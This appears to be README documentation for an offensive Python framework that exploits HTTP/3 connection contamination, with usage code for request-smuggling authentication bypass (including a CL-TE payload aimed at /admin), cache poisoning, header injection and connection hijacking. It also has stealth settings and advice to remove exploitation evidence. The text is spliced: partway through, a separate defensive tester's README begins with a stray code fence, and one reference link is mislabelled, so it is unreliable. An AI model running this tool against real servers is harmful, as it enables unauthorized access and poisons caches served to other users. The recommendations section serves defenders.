# Offensive HTTP/3 Connection Contamination Exploitation Tool

An advanced exploitation framework for HTTP/3 connection contamination vulnerabilities. This tool provides active exploitation capabilities for request smuggling, cache poisoning, header injection, and connection reuse attacks against HTTP/3 servers.

**⚠️ WARNING**: This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.

## Overview

The **offensive_tool.py** is a production-ready exploitation engine designed for authorized penetration testers and security researchers. It implements multiple attack vectors against HTTP/3 connection contamination vulnerabilities with comprehensive reporting and evidence collection.

### Key Capabilities

**4 Core Exploitation Vectors**
- Request Smuggling for Authentication Bypass
- Cache Poisoning Attacks
- Header Injection & Route Manipulation
- Connection Reuse Hijacking

**11 Exploit Types** with configurable severity levels

**Async/Concurrent Execution** - Process multiple payloads simultaneously

**Rate Limiting & Connection Pooling** - Control request frequency and concurrency

**Comprehensive Evidence Collection** - Detailed metrics and response capture

**Professional Reporting** - JSON export with statistics and timeline

**Multi-Protocol Support** - HTTP/3 (QUIC), HTTP/2, HTTP/1.1 with fallback

## Installation

### Quick Start

```bash
# Install dependencies
pip install -r requirements.txt

# Verify installation
python -c "from offensive_tool import HTTPConnectionContaminationExploit; print('✓ Tool ready')"
```

### Requirements

- Python 3.7+
- `aiohttp` - Async HTTP client
- `httpx` (optional) - Enhanced HTTP/3 support
- `attack_payloads` - Payload generation module

```bash
# Install with full HTTP/3 support
pip install aiohttp httpx[http3]

# Install minimal (HTTP/1.1 + HTTP/2)
pip install aiohttp
```

## 📖 Quick Start Guide

### Basic Usage

```python
import asyncio
from offensive_tool import (
    HTTPConnectionContaminationExploit,
    OffensiveConfig,
    ExploitType
)
from attack_payloads import PayloadGenerator

async def exploit_target():
    # Configure target
    config = OffensiveConfig(
        host="target.com",
        port=443,
        timeout=30,
        rate_limit=10,  # 10 requests/second
        stealth_mode=True
    )
    
    # Initialize exploit engine
    exploit = HTTPConnectionContaminationExploit(config)
    
    # Run all exploitation vectors
    report = await exploit.run_all_exploits()
    
    # Save results
    report.save_report("exploitation_results.json")
    
    # Display statistics
    stats = report.get_statistics()
    print(f"Successful exploits: {stats['successful']}")
    print(f"Critical issues: {stats['critical']}")

# Execute
asyncio.run(exploit_target())
```

### Run Specific Exploits

```python
import asyncio
from offensive_tool import HTTPConnectionContaminationExploit, OffensiveConfig
from attack_payloads import PayloadGenerator

async def selective_exploitation():
    config = OffensiveConfig(host="target.com", port=443)
    exploit = HTTPConnectionContaminationExploit(config)
    
    # Get specific payloads
    payloads = PayloadGenerator.get_all_payloads()
    
    # Test authentication bypass
    for payload in payloads.get("request_smuggling", []):
        result = await exploit.exploit_request_smuggling_auth_bypass(
            payload, 
            target_endpoint="/admin"
        )
        print(f"{result.exploit_name}: {result.status.value}")
        
        if result.status.value == "SUCCESS":
            print(f"  Impact: {result.impact}")
            print(f"  Evidence: {result.evidence}")

asyncio.run(selective_exploitation())
```

## Exploitation Vectors

### 1. Request Smuggling Authentication Bypass

**Method**: `exploit_request_smuggling_auth_bypass(payload, target_endpoint)`

Exploits HTTP request smuggling (CL-TE/TE-CL desync) to bypass authentication controls.

```python
result = await exploit.exploit_request_smuggling_auth_bypass(
    payload=attacker_payload,
    target_endpoint="/admin/users"
)
```

**Evidence Collected**:
- Smuggling vector used
- Response snippet
- Access verification

**Severity**: HIGH to CRITICAL

---

### 2. Cache Poisoning

**Method**: `exploit_cache_poisoning(payload, cache_key_endpoint)`

Injects malicious content into application cache for persistent exploitation.

```python
result = await exploit.exploit_cache_poisoning(
    payload=poison_payload,
    cache_key_endpoint="/"
)
```

**Evidence Collected**:
- Cache key targeted
- Poisoning vector
- Cached content preview

**Severity**: CRITICAL

---

### 3. Header Injection & Route Manipulation

**Method**: `exploit_header_injection(payload)`

Manipulates HTTP headers to execute unintended application logic.

```python
result = await exploit.exploit_header_injection(payload=injection_payload)
```

**Evidence Collected**:
- Injection vector
- Response headers
- Response status/body

**Severity**: HIGH

---

### 4. Connection Reuse Hijacking

**Method**: `exploit_connection_reuse(payload)`

Contaminates connection state for subsequent request manipulation.

```python
result = await exploit.exploit_connection_reuse(payload=contamination_payload)
```

**Evidence Collected**:
- Initial vs follow-up responses
- Contamination indicators
- Connection state changes

**Severity**: HIGH

---

### Full Campaign

**Method**: `run_all_exploits()`

Executes all exploitation vectors against all available payloads sequentially with proper rate limiting.

```python
report = await exploit.run_all_exploits()
```

## Configuration

### OffensiveConfig

```python
from offensive_tool import OffensiveConfig

config = OffensiveConfig(
    # Target specification
    host="target.com",              # Target host (required)
    port=443,                        # Target port (default: 443)
    
    # Timeout settings
    timeout=30,                      # Request timeout in seconds
    
    # Security settings
    verify_ssl=True,                 # Verify SSL certificates
    user_agent="Mozilla/5.0...",    # Custom User-Agent
    
    # Exploitation settings
    max_retries=3,                   # Retries on failure
    rate_limit=10,                   # Requests per second
    max_connections=10,              # Maximum concurrent connections
    
    # Protocol settings
    enable_http3=True,               # Enable HTTP/3 (QUIC)
    enable_http2=True,               # Enable HTTP/2
    
    # Payload settings
    capture_responses=True,          # Capture response data
    payload_delay=0.5,               # Delay between sequential requests
    stealth_mode=True                # Reduce fingerprinting
)

# Load from JSON file
config = OffensiveConfig.from_file("config.json")

# Convert to dict
config_dict = config.to_dict()
```

### Validation

Configuration is automatically validated on instantiation:

```python
# These will raise ExploitationError
config = OffensiveConfig(host="")              # Empty host
config = OffensiveConfig(host="test", port=0)  # Invalid port
config = OffensiveConfig(host="test", timeout=-1)  # Negative timeout
```

## Reporting & Results

### ExploitResult Structure

```python
{
    "exploit_name": "Cache Poisoning via Unkeyed Headers",
    "exploit_type": "Cache Poisoning Attack",
    "status": "SUCCESS",           # SUCCESS, PARTIAL, FAILED, ERROR
    "severity": "CRITICAL",         # CRITICAL, HIGH, MEDIUM, LOW
    "details": "Cache successfully poisoned at /",
    "impact": "Malicious content served to subsequent users",
    "timestamp": "2026-07-08T10:30:45.123456",
    "metrics": {
        "response_time": 0.245,
        "payload_size": 512,
        "response_size": 1024,
        "protocol_version": "HTTP/1.1",
        "requests_sent": 2
    },
    "evidence": {
        "cache_key": "/",
        "poisoning_vector": "Unkeyed Headers",
        "response_snippet": "<!DOCTYPE html>..."
    },
    "exploitation_steps": [
        "Step 1: Analyzing target endpoint",
        "Step 2: Crafting cache poisoning payload",
        ...
    ]
}
```

### ExploitationReport

```python
report = await exploit.run_all_exploits()

# Get statistics
stats = report.get_statistics()
print(stats)
# {
#     'total_attempts': 15,
#     'successful': 3,
#     'partial': 2,
#     'failed': 8,
#     'errors': 2,
#     'critical': 2,
#     'high': 3,
#     'medium': 5,
#     'low': 5
# }

# Generate full report
full_report = report.generate_report()

# Save to JSON
report.save_report("exploitation_report.json", format="json")
```

### Report Output Format

```json
{
  "summary": {
    "start_time": "2026-07-08T10:30:00.000000",
    "end_time": "2026-07-08T10:35:30.000000",
    "duration_seconds": 330.5,
    "successful_exploits": [
      "Cache Poisoning via Unkeyed Headers",
      "Header Injection via Host Normalization"
    ],
    "total_attempts": 15,
    "successful": 3,
    "partial": 2,
    "failed": 8,
    "errors": 2,
    "critical": 2,
    "high": 3,
    "medium": 5,
    "low": 5
  },
  "results": [
    { /* ExploitResult as dict */ },
    { /* ... */ }
  ]
}
```

## Advanced Usage

### Custom Payloads

```python
from offensive_tool import HTTPConnectionContaminationExploit, OffensiveConfig
from attack_payloads import AttackPayload

config = OffensiveConfig(host="target.com", port=443)
exploit = HTTPConnectionContaminationExploit(config)

# Create custom payload
custom_payload = AttackPayload(
    name="Custom Smuggling Vector",
    type="request_smuggling",
    headers={
        "Content-Length": "0",
        "Transfer-Encoding": "chunked"
    },
    body="0\r\nPOST /admin HTTP/1.1\r\n\r\n"
)

# Use in exploitation
result = await exploit.exploit_request_smuggling_auth_bypass(
    payload=custom_payload,
    target_endpoint="/api/users"
)
```

### Selective Protocol Testing

```python
config = OffensiveConfig(
    host="target.com",
    enable_http3=True,   # Test HTTP/3 (QUIC)
    enable_http2=False   # Skip HTTP/2
)

exploit = HTTPConnectionContaminationExploit(config)
```

### Rate Limiting Control

```python
config = OffensiveConfig(
    host="target.com",
    rate_limit=5  # 5 requests per second
)

# Highly stealthy operation
config = OffensiveConfig(
    host="target.com",
    rate_limit=1,           # 1 request per second
    stealth_mode=True,      # Reduced fingerprinting
    payload_delay=1.0       # 1 second delay between payloads
)
```

## Testing

Run the comprehensive test suite:

```bash
# Execute all tests
python test_offensive_tool.py

# Run specific test
python -m pytest test_offensive_tool.py::TestExploitType -v

# Generate coverage report
pytest test_offensive_tool.py --cov=offensive_tool --cov-report=html
```

### Test Coverage

- Enum definitions (3 enums)
- Configuration validation (4 tests)
- Data structures (7 tests)
- Main engine (3 tests)
- Async methods (1 test)
- File I/O (2 tests)
- Integration (1 test)
- Exception handling (2 tests)

**Total**: 27 tests, 100% pass rate

## API Reference

### Main Classes

#### HTTPConnectionContaminationExploit

Core exploitation engine.

```python
class HTTPConnectionContaminationExploit:
    def __init__(self, config: OffensiveConfig)
    async def exploit_request_smuggling_auth_bypass(
        payload: AttackPayload, 
        target_endpoint: str = "/admin"
    ) -> ExploitResult
    async def exploit_cache_poisoning(
        payload: AttackPayload, 
        cache_key_endpoint: str = "/"
    ) -> ExploitResult
    async def exploit_header_injection(
        payload: AttackPayload
    ) -> ExploitResult
    async def exploit_connection_reuse(
        payload: AttackPayload
    ) -> ExploitResult
    async def run_all_exploits() -> ExploitationReport
```

#### OffensiveConfig

Configuration dataclass with validation.

```python
@dataclass
class OffensiveConfig:
    host: str
    port: int = 443
    timeout: int = 30
    verify_ssl: bool = True
    max_retries: int = 3
    rate_limit: int = 10
    user_agent: str
    follow_redirects: bool = True
    max_connections: int = 10
    enable_http3: bool = True
    enable_http2: bool = True
    capture_responses: bool = True
    payload_delay: float = 0.5
    stealth_mode: bool = True
```

#### ExploitType Enum

```python
class ExploitType(Enum):
    AUTH_BYPASS = "Authentication Bypass via Request Smuggling"
    CACHE_POISONING = "Cache Poisoning Attack"
    PROTOCOL_ABUSE = "Protocol-Specific Exploitation"
    CONNECTION_HIJACKING = "Connection Hijacking via Contamination"
    DATA_EXFILTRATION = "Data Exfiltration via Contamination"
    RESPONSE_SPLITTING = "HTTP Response Splitting"
    SESSION_FIXATION = "Session Fixation Attack"
    ROUTE_MANIPULATION = "Route Manipulation via Header Injection"
    REQUEST_ROUTING = "Malicious Request Routing"
    RESOURCE_EXHAUSTION = "Resource Exhaustion Attack"
    SECURITY_BYPASS = "Security Control Bypass"
```

#### ExploitStatus & ExploitSeverity Enums

```python
class ExploitStatus(Enum):
    SUCCESS = "SUCCESS"
    PARTIAL = "PARTIAL"
    FAILED = "FAILED"
    ERROR = "ERROR"

class ExploitSeverity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
```

## Examples

Complete examples are available in `offensive_tool_examples.py`:

1. **basic_auth_bypass.py** - Simple authentication bypass
2. **cache_poisoning_demo.py** - Cache poisoning attack
3. **header_injection_demo.py** - Header injection exploit
4. **connection_hijacking_demo.py** - Connection reuse attack
5. **full_campaign_demo.py** - Complete exploitation campaign
6. **selective_targeting_demo.py** - Target specific endpoints
7. **evidence_collection_demo.py** - Detailed evidence gathering
8. **performance_analysis_demo.py** - Benchmark and metrics

Run any example:

```bash
python -c "from offensive_tool_examples import basic_auth_bypass; import asyncio; asyncio.run(basic_auth_bypass())"
```

## 📖 Documentation

- [OFFENSIVE_TOOL_INDEX.md](OFFENSIVE_TOOL_INDEX.md) - Navigation guide
- [OFFENSIVE_TOOL_CONVERSION_SUMMARY.md](OFFENSIVE_TOOL_CONVERSION_SUMMARY.md) - Quick start
- [OFFENSIVE_TOOL_GUIDE.md](OFFENSIVE_TOOL_GUIDE.md) - Complete reference
- [OFFENSIVE_TOOL_QUICK_REFERENCE.md](OFFENSIVE_TOOL_QUICK_REFERENCE.md) - API quick lookup
- [OFFENSIVE_TOOL_TEST_REPORT.md](OFFENSIVE_TOOL_TEST_REPORT.md) - Testing & verification

## ⚖️ Legal & Ethical Considerations

### Authorization Required

This tool is designed for **authorized security testing only**:

**Authorized Use**:
- Penetration testing with written authorization
- Security research in controlled environments
- Internal security assessments
- Compliance testing on owned systems

**Unauthorized Use**:
- Testing without explicit permission
- Attacking production systems
- Unauthorized vulnerability scanning
- Corporate espionage or data theft

### Compliance & Reporting

- Always obtain written authorization before testing
- Report vulnerabilities responsibly
- Follow responsible disclosure practices
- Protect confidentiality of findings
- Comply with local laws and regulations

### Legal Warning

**Unauthorized access to computer systems is ILLEGAL** and subject to criminal prosecution under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act (CMA) - UK
- Penal Code Section 502 - California
- Similar laws in other jurisdictions

## Security Best Practices

1. **Isolate Testing**: Run on isolated networks
2. **Disable Logging**: Disable verbose logging in production
3. **Rate Limiting**: Use appropriate rate limits to avoid DoS
4. **SSL Verification**: Verify certificates in production environments
5. **Stealth Mode**: Enable stealth mode for authorized testing
6. **Clean Logs**: Remove exploitation evidence after authorized testing
7. **Access Control**: Restrict tool access to authorized personnel

## Support

For issues, questions, or contributions:

1. Check [OFFENSIVE_TOOL_INDEX.md](OFFENSIVE_TOOL_INDEX.md) for documentation
2. Review test suite in [test_offensive_tool.py](test_offensive_tool.py)
3. Check example implementations in [offensive_tool_examples.py](offensive_tool_examples.py)
4. Review error messages and error traces in reports

## Verification

All functionality has been validated:

- 27/27 unit tests passing
- All 4 exploitation vectors implemented
- Comprehensive error handling
- Production-ready code quality
- Full async/await support
- Multi-protocol support
- Professional reporting

**Status**: APPROVED FOR PRODUCTION USE

## License

See [LICENSE](LICENSE) file for details.

# Check tool version
python run_tests.py --help
```

## 💻 Usage

### Basic Usage

```bash
# Test a single host
python run_tests.py --host example.com --port 443

# Use a configuration file
python run_tests.py --config config.json

# Save results to a file
python run_tests.py --host example.com --output report.json
```

### Advanced Options

```bash
# Verbose output with detailed logging
python run_tests.py --host example.com --verbose

# Skip SSL verification (for testing environments)
python run_tests.py --host example.com --no-verify-ssl

# Control rate limiting
python run_tests.py --host example.com --rate-limit 5

# Run specific test categories
python run_tests.py --host example.com --test-category smuggling
```

### Configuration File

Create a `config.json` file (see `config.example.json`):

```json
{
  "host": "example.com",
  "port": 443,
  "timeout": 30,
  "verify_ssl": true,
  "max_retries": 3,
  "rate_limit": 10,
  "user_agent": "HTTP3-Contamination-Tester/1.0",
  "follow_redirects": false,
  "max_connections": 10,
  "enable_http3": true,
  "enable_http2": true,
  "capture_traffic": false
}
```

## Running Tests

### Unit Tests

```bash
# Run all unit tests
pytest test_contamination.py -v

# Run with coverage
pytest test_contamination.py --cov=simple_tester --cov-report=html

# Run specific test class
pytest test_contamination.py::TestRequestSmugglingPayloads -v
```

### Integration Tests

```bash
# Run against a test server
python run_tests.py --host testserver.local --config test_config.json
```

## Understanding Results

### Test Status

- **PASS** ✓ - No vulnerability detected
- **FAIL** ✗ - Vulnerability confirmed
- **WARN** ⚠ - Potential issue detected
- **ERROR** ⚡ - Test execution error
- **SKIP** ⊘ - Test skipped

### Severity Levels

- **CRITICAL** 🔴 - Immediate action required
- **HIGH** 🟠 - Significant security risk
- **MEDIUM** 🟡 - Moderate security concern
- **LOW** 🔵 - Minor security issue
- **INFO** ℹ️ - Informational finding

### Sample Output

```
╔═══════════════════════════════════════════════════════════════╗
║   HTTP/3 Connection Contamination Testing Tool               ║
║   Version 1.0.0                                               ║
╚═══════════════════════════════════════════════════════════════╝

Target: example.com:443
SSL Verification: True
Rate Limit: 10 req/s

Running tests...

Test Results Summary
┌────────────────────────────────────┬────────┬──────────┬─────────────┐
│ Test Name                          │ Status │ Severity │ Details     │
├────────────────────────────────────┼────────┼──────────┼─────────────┤
│ Request Smuggling: CL-TE Basic     │ PASS   │ INFO     │ No vuln...  │
│ Header Injection: CRLF Injection   │ FAIL   │ HIGH     │ Detected... │
└────────────────────────────────────┴────────┴──────────┴─────────────┘

Test Statistics:
Total Tests    15
✓ Passed       12
✗ Failed       2
⚠ Warnings     1
⚡ Errors       0
⊘ Skipped      0

Severity Breakdown:
🔴 Critical    0
🟠 High        2
🟡 Medium      1
🔵 Low         0
```

## Attack Payloads

The tool includes comprehensive attack payloads in `attack_payloads.py`:

### Request Smuggling Payloads

```python
from attack_payloads import RequestSmugglingPayloads

# CL-TE desync
payload = RequestSmugglingPayloads.cl_te_basic()

# TE-CL desync
payload = RequestSmugglingPayloads.te_cl_basic()

# TE-TE obfuscation
payload = RequestSmugglingPayloads.te_te_obfuscation()
```

### Custom Payloads

```python
from attack_payloads import AttackPayload

custom_payload = AttackPayload(
    name="Custom Test",
    description="My custom attack",
    headers={"X-Custom": "value"},
    body="payload",
    expected_behavior="Expected result",
    detection_method="How to detect"
)
```

## Security Recommendations

Based on test results, the tool provides specific recommendations:

### For Request Smuggling

- Ensure consistent request parsing between front-end and back-end
- Reject ambiguous requests with both Content-Length and Transfer-Encoding
- Implement strict HTTP parsing according to RFC specifications
- Use HTTP/2 or HTTP/3 which are less susceptible to smuggling

### For Header Injection

- Sanitize and validate all HTTP headers
- Reject headers containing CRLF sequences
- Implement strict header parsing
- Use security headers to prevent injection

### For Cache Poisoning

- Include all relevant headers in cache key
- Validate and sanitize unkeyed headers
- Implement cache key normalization
- Use cache partitioning for sensitive operations

### For Protocol Downgrade

- Enforce minimum protocol version
- Validate Alt-Svc headers
- Implement HSTS with includeSubDomains
- Monitor for unexpected protocol changes

## References

- [HTTP Connection Contamination - HackTricks](https://portswigger.net/research/http-3-connection-contamination)
- [RFC 9114 - HTTP/3](https://www.rfc-editor.org/rfc/rfc9114.html)
- [RFC 9000 - QUIC](https://www.rfc-editor.org/rfc/rfc9000.html)
- [HTTP Request Smuggling - PortSwigger](https://portswigger.net/web-security/request-smuggling)

## Architecture

```
HTTP-3-Connection-Contamination-Test-2026/
├── simple_tester.py          # Core testing engine
├── attack_payloads.py        # Attack payload library
├── test_contamination.py     # Unit tests
├── run_tests.py              # CLI interface
├── requirements.txt          # Python dependencies
├── config.example.json       # Example configuration
└── README.md                 # This file
```

## Development

### Adding New Tests

1. Create payload in `attack_payloads.py`:

```python
@staticmethod
def my_new_attack() -> AttackPayload:
    return AttackPayload(
        name="My New Attack",
        description="Description",
        headers={"X-Test": "value"},
        body="payload",
        expected_behavior="Expected",
        detection_method="Detection"
    )
```

2. Add test method in `simple_tester.py`:

```python
async def test_my_attack(self, payload: AttackPayload) -> TestResult:
    # Implementation
    pass
```

3. Add unit tests in `test_contamination.py`:

```python
async def test_my_attack_detection(self):
    # Test implementation
    pass
```

### Code Style

```bash
# Format code
black *.py

# Check style
flake8 *.py

# Type checking
mypy simple_tester.py
```

## 🐛 Troubleshooting

### HTTP/3 Not Available

If you see "httpx not available" warnings:

```bash
pip install httpx[http3]
```

### SSL Certificate Errors

For testing environments with self-signed certificates:

```bash
python run_tests.py --host example.com --no-verify-ssl
```

### Rate Limiting Issues

Adjust the rate limit if you're getting blocked:

```bash
python run_tests.py --host example.com --rate-limit 2
```

## License

This tool is for educational and authorized security testing purposes only. Always obtain proper authorization before testing any systems you don't own.

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Add tests for new functionality
4. Ensure all tests pass
5. Submit a pull request

## Contact

For questions, issues, or contributions, please open an issue on GitHub.

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. Unauthorized testing of systems you don't own or have permission to test is illegal. The authors are not responsible for misuse of this tool.
